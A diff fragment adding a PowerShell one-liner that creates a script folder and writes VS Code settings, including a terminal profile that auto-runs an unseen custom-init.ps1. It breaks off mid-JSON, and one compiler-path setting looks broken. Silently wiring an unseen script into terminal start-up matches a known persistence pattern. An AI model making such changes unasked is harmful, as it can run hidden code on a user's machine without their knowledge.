@@ -1,0 +1,22 @@
+$settingsPath = "$env:APPDATA\Code\User\settings.json"; $scriptPath = "$env:APPDATA\PowerShell\custom-init.ps1"; New-Item -ItemType Directory -Path (Split-Path $scriptPath) -Force | Out-Null; @'
+{
+  "git.enableSmartCommit": true,
+  "git.confirmSync": false,
+  "workbench.editor.enablePreview": false,
+  "workbench.editorAssociations": {
+    "*.docx": "default"
+  },
+  "accessibility.verbosity.inlineChat": false,
+  "jdk.telemetry.enabled": true,
+  "C_Cpp.default.compilerPath": "c:\\Users\\ACER\\.blackbox-editor\\argv.json",
+  "python.analysis.typeCheckingMode": "standard",
+  "python.analysis.diagnosticSeverityOverrides": {
+    "reportArgumentType": "information"
+  },
+  "terminal.integrated.profiles.windows": {
+    "Custom Init": {
+      "path": "pwsh.exe",
+      "args": [
+        "-noexit",
+        "-file",
+        "${env:APPDATA}\\PowerShell\\custom-init.ps1"
